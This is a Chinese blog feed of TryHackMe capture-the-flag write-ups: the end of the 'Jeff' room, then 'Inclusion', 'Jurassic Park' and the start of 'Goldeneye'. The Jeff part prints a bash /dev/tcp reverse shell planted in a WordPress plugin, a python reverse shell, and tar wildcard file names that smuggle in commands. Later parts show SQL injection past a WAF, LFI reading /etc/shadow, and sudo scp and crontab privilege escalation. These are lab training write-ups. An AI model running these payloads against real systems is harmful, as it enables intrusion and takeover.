<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;Jeff&#39;s file uploader&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	</span><br><span class="line">	&lt;form action&#x3D;&quot;#&quot;&gt;</span><br><span class="line">		&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;upload_file&quot; &#x2F;&gt;</span><br><span class="line">		&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Upload&quot;&gt;</span><br><span class="line">	&lt;&#x2F;form&gt;	</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>空动作。</p>
<p>admin，sound_codes都是访问空白页面。backups则有个Jeff.thm的字样，assets。403</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;jeff.thm&#x2F;backups&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt -x zip,gzip,rar</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Url:            http:&#x2F;&#x2F;jeff.thm&#x2F;backups&#x2F;</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster&#x2F;3.0.1</span><br><span class="line">[+] Extensions:     zip,gzip,rar</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2020&#x2F;10&#x2F;17 05:04:53 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;backup.zip (Status: 200)</span><br></pre></td></tr></table></figure>



<p>解压需要密码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zip2john backup.zip &gt; zip.hash</span><br><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt zip.hash</span><br><span class="line">john --show zip.hash</span><br><span class="line">backup.zip:!!Burningbird!!::backup.zip:backup&#x2F;wpadmin.bak, backup&#x2F;assets&#x2F;EnlighterJS.min.js, backup&#x2F;assets&#x2F;MooTools-Core-1.6.0-compressed.js:backup.zip</span><br></pre></td></tr></table></figure>

<p>查看wpadmin.bak</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wordpress password is: phO#g)C5dhIWZn3BKP</span><br></pre></td></tr></table></figure>

<p>有wordpress？但是没扫出来啊。。试下子域名爆破</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wfuzz -c -f subdomains.txt -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;DNS&#x2F;subdomains-top1million-5000.txt -u &quot;http:&#x2F;&#x2F;jeff.thm&#x2F;&quot; -H &quot;Host: FUZZ.jeff.thm&quot; --hl 1</span><br><span class="line"></span><br><span class="line">Target: http:&#x2F;&#x2F;jeff.thm&#x2F;</span><br><span class="line">Total requests: 4997</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">ID      Response   Lines      Word         Chars          Request</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">00326:  C&#x3D;200    346 L      1455 W        25901 Ch       &quot;wordpress&quot;</span><br><span class="line"></span><br><span class="line">Total time: 0</span><br><span class="line">Processed Requests: 4997</span><br><span class="line">Filtered Requests: 4996</span><br><span class="line">Requests&#x2F;sec.: 0</span><br></pre></td></tr></table></figure>

<p>接着把<code>ip wordpress.jeff.thm</code>追加到<code>/etc/hosts</code>里面</p>
<p><img src="https://images.atsud0.me/images/post/image-20201017121851589.png" alt="image-20201017121851589"></p>
<p>用户应该是jeff。</p>
<p>登陆成功</p>
<p><img src="https://images.atsud0.me/images/post/image-20201017121922332.png" alt="image-20201017121922332"></p>
<p>直接修改插件<strong>akismet/akismet.php</strong>，添加</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system(&#39;bash -c &quot;bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;1234 0&gt;&amp;1&quot;&#39;);</span><br></pre></td></tr></table></figure>



<p><img src="https://images.atsud0.me/images/post/image-20201017122021709.png" alt="image-20201017122021709"></p>
<p><img src="https://images.atsud0.me/images/post/image-20201017122135114.png" alt="image-20201017122135114"></p>
<p>改好之后直接激活即可。（直接访问目录不行，应为目标环境设置了相应目录的403权限.</p>
<h2 id="0x02-提权"><a href="#0x02-提权" class="headerlink" title="0x02 提权"></a>0x02 提权</h2><h3 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h3><p><img src="https://images.atsud0.me/images/post/image-20201017122237735.png" alt="image-20201017122237735"></p>
<p>经过一段时间信息收集后，我发现这是个docker容器。。。不过在wordpress目录下还是能找到一个有趣的文件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    <span class="doctag">Todo:</span> I need to finish coding this database backup script.</span></span><br><span class="line"><span class="comment">	  also maybe convert it to a wordpress plugin in the future.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">$dbFile = <span class="string">'db_backup/backup.sql'</span>;</span><br><span class="line">$ftpFile = <span class="string">'backup.sql'</span>;</span><br><span class="line"></span><br><span class="line">$username = <span class="string">"backupmgr"</span>;</span><br><span class="line">$password = <span class="string">"SuperS1ckP4ssw0rd123!"</span>;</span><br><span class="line"></span><br><span class="line">$ftp = ftp_connect(<span class="string">"172.20.0.1"</span>); <span class="comment">// todo, set up /etc/hosts for the container host</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( ! ftp_login($ftp, $username, $password) )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"FTP Login failed."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$msg = <span class="string">"Upload failed"</span>;</span><br><span class="line"><span class="keyword">if</span> (ftp_put($ftp, $remote_file, $file, FTP_ASCII)) &#123;</span><br><span class="line">    $msg = <span class="string">"$file was uploaded.\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $msg;</span><br><span class="line">ftp_close($conn_id);</span><br></pre></td></tr></table></figure>

<p>这里已经有一个ftp用户的凭证了，我尝试用ssh登陆这个用户，但是不成功。不过猜测上传之后，应该是会有一个打包程序在ftp服务器执行的。</p>
<p>新建一个以下内容的shell.sh，新建一个空文本的a.txt和b.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i'])"</span></span><br></pre></td></tr></table></figure>

<p>修改之后ftp_backup.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$username = <span class="string">"backupmgr"</span>;</span><br><span class="line">$password = <span class="string">"SuperS1ckP4ssw0rd123!"</span>;</span><br><span class="line">$ftpfile_sh = <span class="string">"shell.sh"</span>;</span><br><span class="line">$ftpfile_1=<span class="string">"--checkpoint=1"</span>;</span><br><span class="line">$ftpfile_2=<span class="string">"--checkpoint-action=exec=sh shell.sh"</span>;</span><br><span class="line"></span><br><span class="line">$ftp = ftp_connect(<span class="string">"172.20.0.1"</span>); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( ! ftp_login($ftp, $username, $password) )&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'die!!!'</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"FTP Login failed."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ftp_pasv($ftp, <span class="keyword">false</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line">print_r (ftp_nlist($ftp,<span class="string">"/"</span>));</span><br><span class="line"></span><br><span class="line">ftp_chdir($ftp,<span class="string">"files"</span>);</span><br><span class="line">print_r (ftp_nlist($ftp,<span class="string">"."</span>));</span><br><span class="line">print_r (ftp_pwd($ftp));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> ftp_put($ftp,$ftpfile_sh,<span class="string">"./shell.sh"</span>,FTP_ASCII);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> ftp_put($ftp,$ftpfile_1,<span class="string">"./a.txt"</span>,FTP_ASCII);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> ftp_put($ftp,$ftpfile_2,<span class="string">"./b.txt"</span>,FTP_ASCII);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line">print_r (ftp_nlist($ftp,<span class="string">"."</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ftp_close($ftp);</span><br></pre></td></tr></table></figure>

<p>搞半天终于上传成功。。看php的ftp方法时有个ftp_exec()但是我死活用不上了。。谷歌之后也不明所以。。知道的大手子可以告诉我下。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201017150224084.png" alt="image-20201017150224084"></p>
<p><img src="https://images.atsud0.me/images/post/image-20201017153333196.png" alt="image-20201017153333196"></p>
<h3 id="backupmgr"><a href="#backupmgr" class="headerlink" title="backupmgr"></a>backupmgr</h3><p><img src="https://images.atsud0.me/images/post/image-20201017153413369.png" alt="image-20201017153413369"></p>
<p>这里是利用tar的通配符提权，连进去之后看看crontab -l，就会发现有个定时打包的脚本了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -user jeff -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;opt&#x2F;systools&#x2F;systool</span><br><span class="line">&#x2F;var&#x2F;backups&#x2F;jeff.bak</span><br></pre></td></tr></table></figure>

<p>jeff.bak没有权限。</p>
<p>systool是个程序。输入1则会执行ps aux，2的话就会打印message.txt的内容，3的话就退出。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201017163005686.png" alt="image-20201017163005686"></p>
<p>systool相同目录下有个文本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">backupmgr@tryharder:&#x2F;opt&#x2F;systools$ cat message.txt</span><br><span class="line"></span><br><span class="line">Jeff, you should login with your own account to view&#x2F;change your password. I hope you haven&#39;t forgotten it.</span><br></pre></td></tr></table></figure>

<p>这两个文件属于同一个组 <code>pwman</code>,<code>messaget.txt</code>的话，可以直接删掉，创建一个同名的符号链接指向<code>jeff.bak</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -s &#x2F;var&#x2F;backups&#x2F;jeff.bak message.txt</span><br></pre></td></tr></table></figure>

<p>再次执行systool</p>
<p><img src="https://images.atsud0.me/images/post/image-20201017163310102.png" alt="image-20201017163310102"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Your Password is: 123-My-N4M3-1z-J3ff-123</span><br></pre></td></tr></table></figure>

<p>我这里直接用<code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>但是不成功。如果是Linux环境的话可以尝试用这个方法打开tty，然后切换jeff用户。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SHELL&#x3D;&#x2F;bin&#x2F;bash script -q &#x2F;dev&#x2F;null</span><br><span class="line">Ctrl-Z</span><br><span class="line">stty raw -echo</span><br><span class="line">fg</span><br><span class="line">reset</span><br><span class="line">xterm</span><br></pre></td></tr></table></figure>



<h3 id="jeff"><a href="#jeff" class="headerlink" title="jeff"></a>jeff</h3><p>ssh 登陆进jeff后，会发现这是一个该死的rbash..</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jeff@tryharder:~$ vim</span><br><span class="line">-rbash: &#x2F;usr&#x2F;lib&#x2F;command-not-found: restricted: cannot specify &#96;&#x2F;&#39; in command names</span><br><span class="line">jeff@tryharder:~$ echo $SHELL</span><br><span class="line">&#x2F;bin&#x2F;rbash</span><br></pre></td></tr></table></figure>

<p>搜索了一下逃逸方式后，我选用了这个。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh jeff@jeff.thm -t &quot;bash --noprofile&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jeff@tryharder:~$ sudo -l</span><br><span class="line">[sudo] password for jeff:</span><br><span class="line">Matching Defaults entries for jeff on tryharder:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User jeff may run the following commands on tryharder:</span><br><span class="line">    (ALL) &#x2F;usr&#x2F;bin&#x2F;crontab</span><br></pre></td></tr></table></figure>



<p><img src="https://images.atsud0.me/images/post/image-20201017162810654.png" alt="image-20201017162810654"></p>
<p>进到crontab的编辑器会发现这是vi编辑器，所以可以直接这样提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:!&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>



<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>jeff user的flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo -n user.txt|md5</span><br></pre></td></tr></table></figure>

<p>root的就在root目录下</p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>wordpress</tag>
        <tag>php_ftp</tag>
        <tag>rbash_escape</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-Inclusion</title>
    <url>/2020/04/20/TryHackMe-Inclusion/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>主要涉及<code>LFI</code>本地文件包含漏洞<br><a href="/2020/4/20/TryHackMe-LFI/">LFI</a>房间的提升练习<br><a href="https://tryhackme.com/room/inclusion" target="_blank" rel="noopener">靶机连接</a><br>靶机难度:十分简单</p>
<a id="more"></a>

<p>上来先用nmap扫一扫</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200420_203602.jpg" alt="nmap"></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200420_210105.jpg" alt="/etc/passwd"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">falconfeast:x:1000:1000:falconfeast,,,:&#x2F;home&#x2F;falconfeast:&#x2F;bin&#x2F;bash #falconfeast:rootpassword</span><br></pre></td></tr></table></figure>

<p>尝试去看看该用户的家目录下有没有私钥,结果没有.</p>
<p>去看看<code>/etc/shadow</code><br><img src="https://images.atsud0.me/images/post/Screenshot_20200420_210636.jpg" alt="/etc/shodow"></p>
<p>能访问，把hash值copy下来，去kali下跑下字典。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -a 0 2.txt &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz -o res.txt --force -m 1800</span><br></pre></td></tr></table></figure>

<p>在等待的期间 测试下RFI,结果不行。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200420_213730.jpg" alt="norfi"></p>
<p>看着hashcat，并没有给我跑出密码。所以，这一刻。我觉得我傻逼了，为什么不直接通过LFI去看看root.txt和user.txt？</p>
<p>最后还真是。。。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200420_214351.jpg" alt="user.txt"></p>
<p>事实证明，是我想得太复杂了。摔（</p>
<p><img src="https://images.atsud0.me/images/post/image-1586576193417.png" alt="file"></p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>LFI</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-Jurassic Park</title>
    <url>/2020/05/17/TryHackMe-Jurassic-Park/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><a href="https://tryhackme.com/room/jurassicpark" title="" target="">在线靶机:Jurassic Park</a>

<p>靶机难度:中等</p>
<p>本文涉及:</p>
<ul>
<li>SQL注入</li>
<li>sudo-scp提权</li>
</ul>
<a id="more"></a>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫描，显示目标开放了两个端口。</p>
<ul>
<li>22 ssh</li>
<li>80 http</li>
</ul>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200517_180405.jpg" alt="nmap"></p>
<p>接着扫描一下网站路径<br><img src="https://images.atsud0.me/images/post/Screenshot_20200517_181122.jpg" alt="dirb"></p>
<p>尝试访问<code>delete</code>，但是没看懂表达什么意思。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200517_181235.jpg" alt="没看懂.."></p>
<p><code>robots</code>也是一无所获。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200517_181341.jpg" alt="robots"></p>
<p>从首页进来后会发现一个商店界面，这恐龙还蛮帅的。不过我没看过侏罗纪这电影。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200517_181445.jpg" alt="Dinosaur"></p>
<p>随便点击一个购买页面进去后，很显然的，我们发现了一个是get传值可能存在sql注入漏洞的页面。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200517_181653.jpg" alt="sql_in"></p>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>用<code>?id=3 and 1=2</code>发现页面返回了一个空页面，确认存在注入。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200517_182132.jpg" alt=""></p>
<p>而且好像是不用闭合的。但是我在判断闭合的时候发现如果输入了<code>&#39;</code>的话，会触发<code>WAF</code>导致<code>&#39;</code>被过滤。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200517_182552.jpg" alt="sql"></p>
<p>所以这还是有<code>WAF</code>的？</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200517_182826.jpg" alt="sd"></p>
<p>这个还是简单的，用联合注入就好，判断列数后，判断显示位之后就正常查询information就好了。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200517_195518.jpg" alt="select1"></p>
<p>但是有个问题，当查询username后，会触发<code>WAF</code>。所以判断<code>username</code>和<code>&#39;</code>是关键词。</p>
<p>这里我已经查询出密码字段了，但是没有帐号。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200517_195511.jpg" alt="password"></p>
<p>最后在网页中也实在找不到了什么线索了，重新回到sql注入页面中，重新注入，看有没有遗漏了什么。最后在<code>items</code>表中查询<code>id</code>后发现还有两个<code>id</code>是不在商店页面显示的。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200517_201908.jpg" alt="items-id"></p>
<p>找到了一个用户名，但是我们还不确定是不是不过可以先记着。同时我们也知道了WAF的关键词。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200517_202026.jpg" alt="username"></p>
<p>因为服务器只开启了<code>ssh</code>和<code>http</code>端口，而且我也扫不出后台。只好用这密码和上面那个用户名去登录试试。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200517_202244.jpg" alt="login-ssh"></p>
<p>运气不错，还是登录成功了。进来之后我们就能立马找到第一个flag了。</p>
<p>第一个flag。<img src="https://images.atsud0.me/images/post/Screenshot_20200517_202332.jpg" alt="flag1"></p>
<p>用find命令找到第二个flag-<code>flagTwo</code><img src="https://images.atsud0.me/images/post/Screenshot_20200517_202550.jpg" alt="flag-two"></p>
<p>第三个flag藏在<code>.bash_history</code>中<img src="https://images.atsud0.me/images/post/Screenshot_20200517_202748.jpg" alt="找了半天"></p>
<p>最后一个flag需要我们提权。<img src="https://images.atsud0.me/images/post/Screenshot_20200517_203026.jpg" alt="flag5"></p>
<p>可以看到虽然有一个<code>test.sh</code>直接告诉了我们<code>flag5</code>在哪里，但是我们是无法成功执行这个脚本命令的，因为普通用户没有权限去查看<code>root</code>的家目录。</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>但是我们还有<code>scp</code>啊。</p>
<blockquote><p>It runs in privileged context and may be used to access the file system, escalate or maintain access with elevated privileges if enabled on sudo.</p>
<footer><strong>gtfobins</strong><cite><a href="https://gtfobins.github.io/gtfobins/scp/" target="_blank" rel="noopener">gtfobins-sudo-scp</a></cite></footer></blockquote>
<p>利用方式如下</p>
<figure class="highlight plain"><figcaption><span>scp</span><a href="https://gtfobins.github.io/gtfobins/scp/" target="_blank" rel="noopener">shell</a></figcaption><table><tr><td class="code"><pre><span class="line">TF&#x3D;$(mktemp)</span><br><span class="line">echo &#39;sh 0&lt;&amp;2 1&gt;&amp;2&#39; &gt; $TF </span><br><span class="line">chmod +x &quot;$TF&quot; </span><br><span class="line">sudo scp -S $TF x y:</span><br></pre></td></tr></table></figure>

<p>现在我们已经获得<code>root</code>权限了。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200517_203832.jpg" alt="root"></p>
<p><code>TF=$(mktemp)</code> #在tmp目录下生成一个临时文件，并把路径赋给变量TF。所以$TF是一个文件。</p>
<p><code>echo &#39;sh 0&lt;&amp;2 1&gt;&amp;2&#39; &gt; $TF</code> #将sh 0&lt;&amp;2 1&gt;&amp;2内容添加到TF文件中，从标准错误输出中读取输入写入到键盘输入中，然后又将标准输出的输出写入到标准错误输出中。<del>所以最后是变成了标准输出的输入重定向到了键盘输入中了？</del></p>
<p><code>chmod +x &quot;$TF&quot;</code> #给予可执行权限</p>
<p><code>sudo scp -S $TF x y:</code> #指定加密传输时使用$TF这个脚本程序，后面的x代表一个本地文件，y代表远端Ip。这里后面的x，y代表的是什么都无所谓了。因为会先执行$TF这个脚本文件。所以你写<code>aaa</code>还是<code>bbb</code>都无伤大雅，但是冒号一定要带上。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200517_204823.jpg" alt="aaa"></p>
<p>所以我们也可以改写成python反弹shell到攻击机上。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200517_210041.jpg" alt="python"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这好像是我在<a href="https://tryhackme.com/dashboard" title="" target="">TryHackMe</a>上面完成的第一个高难度的靶机？其实实际上做起来感觉也不是很难。。</p>
<p>所以我在这一个靶机上学会了:</p>
<ul>
<li>scp sudo提权</li>
</ul>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>sql_injection</tag>
        <tag>GTFOBins-scp</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-Goldeneye</title>
    <url>/2020/09/27/TryHackMe-Goldeneye/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>在线靶机链接:<a href="https://tryhackme.com/room/goldeneye" target="_blank" rel="noopener">Goldeneye</a></p>
<a id="more"></a>

<h2 id="0x01信息收集"><a href="#0x01信息收集" class="headerlink" title="0x01信息收集"></a>0x01信息收集</h2><h3 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p- -sC -sV [IP]</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20200927100312943.png" alt="image-20200927100312943"></p>
<p>25是smtp邮箱，80是http，55007是pop3，然后55006就不知道是啥- -。</p>
<h3 id="Http-Dirb"><a href="#Http-Dirb" class="headerlink" title="Http-Dirb"></a>Http-Dirb</h3><p><img src="https://images.atsud0.me/images/post/image-20200927100744246.png" alt="image-20200927100744246"></p>
<p>没扫到什么东西。。</p>
<p><img src="https://images.atsud0.me/images/post/image-20200927101021178.png" alt="image-20200927101021178"></p>
<p>首页也没啥。。</p>
<p><img src="https://images.atsud0.me/images/post/image-20200927101144504.png" alt="image-20200927101144504"></p>
<p>所以得到了一个用户名Boris，和一段URL编码的密码（实际上往google上面一粘贴密码就出来了。。</p>
